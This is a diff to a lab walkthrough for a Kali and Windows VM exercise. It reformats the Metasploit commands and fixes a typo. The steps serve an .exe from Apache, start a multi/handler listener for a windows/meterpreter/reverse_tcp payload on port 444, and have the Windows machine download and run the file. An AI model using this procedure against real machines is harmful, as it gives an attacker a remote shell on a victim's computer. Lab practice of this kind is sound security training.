@@ -17,17 +17,17 @@ Makes the file accessible via a web server hosting on your Kali machine.
 $ service apache2 start
 
 - Set the listener to capture the incoming connection when the victim runs the file
-$ use exploit/multi/handler
-$ set payload windows/meterpreter/reverse_tcp
-$ set LHOST {your-local-IP address}
-$ set LPORT 444
+msf5 > use exploit/multi/handler
+msf5 > set payload windows/meterpreter/reverse_tcp
+msf5 > set LHOST {your-local-IP address}
+msf5 > set LPORT 444
 
 - To begin listening
-$ run
+msf5 > run
 
 --> Switch from Kali VM to Windows machine <--
 - Open a web browser
-- Enter the loacl IP address of your Kali machine
+- Enter the local IP address of your Kali machine
 (in the search bar): {local-IP}/{filename}.exe
 - Save the file, and run it.
 
